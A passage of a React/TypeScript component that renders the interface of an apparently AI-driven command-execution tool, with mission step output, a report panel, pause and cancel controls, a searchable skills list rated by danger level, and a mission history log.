                        {step.output && step.status === 'done' && (
                          <pre className="mt-1.5 text-[8px] overflow-x-auto max-h-20 p-1.5"
                            style={{ color: NEON_GREEN, background: 'rgba(0,0,0,0.4)', whiteSpace: 'pre-wrap', wordBreak: 'break-all' }}>
                            {step.output.length > 500 ? step.output.slice(0, 500) + '\n... (truncated)' : step.output}
                          </pre>
                        )}
                      </motion.div>
                    );
                  })}
                </div>
              )}

              {/* Analysis Report */}
              {analysisReport && phase === 'completed' && (
                <div className="mt-4 border p-3" style={{ background: BG_CARD, borderColor: `${ORANGE}33` }}>
                  <div className="flex items-center justify-between mb-2">
                    <span className="text-[9px] uppercase tracking-[0.2em] font-bold" style={{ color: ORANGE }}>
                      Mission Report
                    </span>
                    <button onClick={copyReportToClipboard} className="text-gray-600 hover:text-white transition-colors">
                      {copiedReport ? <Check size={12} style={{ color: NEON_GREEN }} /> : <Copy size={12} />}
                    </button>
                  </div>
                  <div className="markdown-body text-[10px]">
                    <ReactMarkdown>{analysisReport}</ReactMarkdown>
                  </div>
                </div>
              )}

              {/* Loading dots during active phases */}
              {isRunning && (
                <motion.div
                  className="flex items-center gap-2 text-[9px] mt-2"
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                >
                  {[0, 1, 2].map(i => (
                    <motion.div
                      key={i}
                      className="w-1.5 h-1.5"
                      style={{ background: ORANGE }}
                      animate={{ opacity: [0.2, 1, 0.2], scale: [0.8, 1.2, 0.8] }}
                      transition={{ repeat: Infinity, duration: 1, delay: i * 0.2 }}
                    />
                  ))}
                  <span className="text-gray-600 ml-1">
                    {phase === 'planning' ? 'AI is planning...' :
                     phase === 'executing' ? paused ? 'Paused' : 'Executing commands...' :
                     phase === 'analyzing' ? 'AI is analyzing...' :
                     'Processing...'}
                  </span>
                </motion.div>
              )}

              <div ref={consoleEndRef} />
            </div>

            {/* ── Execution Controls ── */}
            {isRunning && (
              <div className="flex items-center gap-2 px-3 py-2 border-t shrink-0"
                style={{ background: BG_CARD, borderColor: 'rgba(255,255,255,0.06)' }}>
                <button onClick={handlePauseResume}
                  className="flex items-center gap-1.5 px-3 py-1.5 text-[9px] uppercase font-bold border transition-colors"
                  style={{
                    color: paused ? NEON_GREEN : ORANGE,
                    borderColor: paused ? `${NEON_GREEN}44` : `${ORANGE}44`,
                    background: paused ? `${NEON_GREEN}11` : `${ORANGE}11`,
                  }}>
                  {paused ? <Play size={11} /> : <Pause size={11} />}
                  {paused ? 'Resume' : 'Pause'}
                </button>
                <button onClick={handleCancelMission}
                  className="flex items-center gap-1.5 px-3 py-1.5 text-[9px] uppercase font-bold border text-red-400 border-red-500/30 bg-red-500/10 transition-colors">
                  <X size={11} /> Cancel
                </button>
                <div className="flex-1" />
                <span className="text-[8px] text-gray-600 uppercase tracking-widest">
                  Mode: {execMode.toUpperCase()}
                </span>
              </div>
            )}

            {/* ── New Mission button (when completed) ── */}
            {phase === 'completed' && (
              <div className="flex items-center gap-2 px-3 py-2 border-t shrink-0"
                style={{ background: BG_CARD, borderColor: 'rgba(255,255,255,0.06)' }}>
                <button onClick={() => { setPhase('idle'); setCurrentPlan(null); setLogs([]); setAnalysisReport(''); }}
                  className="flex-1 flex items-center justify-center gap-2 py-2 text-[10px] uppercase tracking-widest font-bold text-black"
                  style={{ background: `linear-gradient(135deg, ${ORANGE}, #cc3300)` }}>
                  <RotateCcw size={12} /> New Mission
                </button>
                <button onClick={handleExportReport}
                  className="flex items-center gap-1.5 px-3 py-2 text-[9px] uppercase font-bold text-gray-400 border border-gray-700 transition-colors">
                  <Download size={12} /> Export
                </button>
              </div>
            )}
          </div>
        )}

        {/* ═══ SKILLS DATABASE SECTION ═══ */}
        {activeSection === 'skills' && (
          <div className="flex flex-col h-full">
            {/* Search & Filter Bar */}
            <div className="p-3 space-y-2 border-b shrink-0" style={{ borderColor: 'rgba(255,255,255,0.04)' }}>
              <div className="flex gap-2">
                <div className="relative flex-1">
                  <Search size={12} className="absolute left-2.5 top-1/2 -translate-y-1/2 text-gray-600" />
                  <input value={skillSearch} onChange={e => setSkillSearch(e.target.value)}
                    placeholder="Search skills, tags, descriptions..."
                    className="w-full text-xs p-2 pl-7 outline-none"
                    style={{ background: BG_CARD, border: '1px solid rgba(255,255,255,0.06)', color: '#e0e0e0' }} />
                </div>
              </div>
              <div className="flex items-center gap-2 overflow-x-auto no-scrollbar">
                <select value={skillCatFilter} onChange={e => setSkillCatFilter(e.target.value as SkillCategory | 'all')}
                  className="text-[8px] uppercase font-bold p-1.5 outline-none"
                  style={{ background: BG_CARD, border: '1px solid rgba(255,255,255,0.06)', color: '#a0a0a0' }}>
                  <option value="all">All Categories</option>
                  {CATEGORIES_ORDERED.map(c => (
                    <option key={c} value={c}>{CATEGORY_CONFIG[c].label}</option>
                  ))}
                </select>
                <select value={skillDangerFilter} onChange={e => setSkillDangerFilter(e.target.value as DangerLevel | 'all')}
                  className="text-[8px] uppercase font-bold p-1.5 outline-none"
                  style={{ background: BG_CARD, border: '1px solid rgba(255,255,255,0.06)', color: '#a0a0a0' }}>
                  <option value="all">All Levels</option>
                  <option value="low">Low</option>
                  <option value="medium">Medium</option>
                  <option value="high">High</option>
                  <option value="critical">Critical</option>
                </select>
                <span className="text-[8px] text-gray-600 whitespace-nowrap">{filteredSkills.length} skills</span>
              </div>
            </div>

            {/* Skills List */}
            <div className="flex-1 overflow-y-auto custom-scrollbar p-3 space-y-4">
              {Object.entries(skillsByCategory).map(([cat, skills]) => (
                <div key={cat}>
                  <div className="flex items-center gap-2 mb-2">
                    {CATEGORY_CONFIG[cat as SkillCategory].icon}
                    <span className={cn("text-[9px] uppercase tracking-[0.15em] font-bold", CATEGORY_CONFIG[cat as SkillCategory].color)}>
                      {CATEGORY_CONFIG[cat as SkillCategory].label}
                    </span>
                    <span className="text-[7px] text-gray-700">({skills.length})</span>
                  </div>
                  <div className="space-y-1">
                    {skills.map(skill => (
                      <button key={skill.id}
                        onClick={() => setSelectedSkill(selectedSkill?.id === skill.id ? null : skill)}
                        className="w-full text-left p-2 border transition-colors"
                        style={{
                          background: selectedSkill?.id === skill.id ? `${ORANGE}0a` : BG_CARD,
                          borderColor: selectedSkill?.id === skill.id ? `${ORANGE}33` : 'rgba(255,255,255,0.03)',
                        }}>
                        <div className="flex items-center justify-between">
                          <span className="text-[9px] font-bold text-gray-300">{skill.name}</span>
                          <div className="flex items-center gap-1.5">
                            <span className={cn("text-[6px] px-1 py-0.5 border font-bold uppercase", DANGER_STYLES[skill.dangerLevel])}>
                              {skill.dangerLevel}
                            </span>
                          </div>
                        </div>
                        <p className="text-[8px] text-gray-600 mt-0.5">{skill.description}</p>

                        {/* Expanded detail */}
                        <AnimatePresence>
                          {selectedSkill?.id === skill.id && (
                            <motion.div
                              initial={{ height: 0, opacity: 0 }}
                              animate={{ height: 'auto', opacity: 1 }}
                              exit={{ height: 0, opacity: 0 }}
                              className="overflow-hidden"
                            >
                              <div className="mt-2 pt-2 space-y-2" style={{ borderTop: `1px solid ${ORANGE}22` }}>
                                <div>
                                  <span className="text-[7px] uppercase tracking-widest font-bold text-gray-600">Commands</span>
                                  {skill.commands.map((cmd, ci) => (
                                    <div key={ci} className="flex items-center gap-1.5 mt-1">
                                      <code className="flex-1 text-[8px] p-1.5" style={{ background: 'rgba(0,0,0,0.4)', color: NEON_GREEN }}>
                                        {resolveCommand(cmd)}
                                      </code>
                                      <button onClick={(e) => { e.stopPropagation(); onRunInTerminal(resolveCommand(cmd)); }}
                                        className="p-1 text-gray-600 hover:text-white transition-colors" title="Run in Terminal">
                                        <Terminal size={10} />
                                      </button>
                                      <button onClick={(e) => {
                                        e.stopPropagation();
                                        onExecuteCommand(resolveCommand(cmd));
                                      }}
                                        className="p-1 text-gray-600 hover:text-white transition-colors" title="Execute Here">
                                        <Play size={10} />
                                      </button>
                                    </div>
                                  ))}
                                </div>
                                {skill.installCmd && (
                                  <div>
                                    <span className="text-[7px] uppercase tracking-widest font-bold text-gray-600">Install</span>
                                    <code className="block text-[8px] p-1.5 mt-0.5" style={{ background: 'rgba(0,0,0,0.4)', color: '#facc15' }}>
                                      {skill.installCmd}
                                    </code>
                                  </div>
                                )}
                                <div className="flex flex-wrap gap-1">
                                  {skill.tags.map(tag => (
                                    <span key={tag} className="text-[6px] px-1.5 py-0.5 text-gray-600 border border-gray-800 uppercase">
                                      {tag}
                                    </span>
                                  ))}
                                </div>
                              </div>
                            </motion.div>
                          )}
                        </AnimatePresence>
                      </button>
                    ))}
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}

        {/* ═══ HISTORY SECTION ═══ */}
        {activeSection === 'history' && (
          <div className="flex-1 overflow-y-auto custom-scrollbar p-3 space-y-2">
            {missionHistory.length === 0 ? (
              <div className="flex flex-col items-center justify-center h-full text-center space-y-2">
                <ScrollText size={24} className="text-gray-700" />
                <p className="text-[10px] text-gray-600 uppercase tracking-widest">No mission history</p>
                <p className="text-[8px] text-gray-700">Completed missions will appear here</p>
              </div>
            ) : (
              <>
                <div className="text-[8px] uppercase tracking-[0.2em] font-bold text-gray-600 pb-1 border-b" style={{ borderColor: 'rgba(255,255,255,0.06)' }}>
                  Mission Log ({missionHistory.length})
                </div>
                {[...missionHistory].reverse().map(mission => (
                  <div key={mission.id} className="border p-2.5 space-y-1.5" style={{ background: BG_CARD, borderColor: 'rgba(255,255,255,0.04)' }}>
                    <div className="flex items-center justify-between">
                      <span className="text-[9px] font-bold text-gray-300 truncate flex-1">{mission.objective.slice(0, 60)}...</span>
                      <span className={cn(
                        "text-[7px] px-1.5 py-0.5 font-bold uppercase ml-2",
                        mission.status === 'completed' ? "text-green-400 bg-green-500/10" :
                        mission.status === 'error' ? "text-red-400 bg-red-500/10" :
                        "text-yellow-400 bg-yellow-500/10"
                      )}>
                        {mission.status}
                      </span>
                    </div>
                    <div className="flex items-center gap-3 text-[8px] text-gray-600">
                      <span>{mission.plan.steps.length} steps</span>
                      <span>{new Date(mission.completedAt || mission.logs[0]?.timestamp || Date.now()).toLocaleString()}</span>
                      <span className="uppercase">{mission.plan.risk_level}</span>
                    </div>
                    <div className="space-y-0.5 max-h-16 overflow-y-auto">
                      {mission.logs.slice(-5).map((log, i) => (
                        <div key={i} className="text-[7px] text-gray-700 truncate">
                          <span style={{ color: PHASE_LABELS[log.phase].color }}>[{log.phase}]</span> {log.message}
                        </div>
                      ))}
                    </div>
                  </div>
                ))}
              </>
            )}
          </div>
        )}
      </div>
    </div>
  );
};
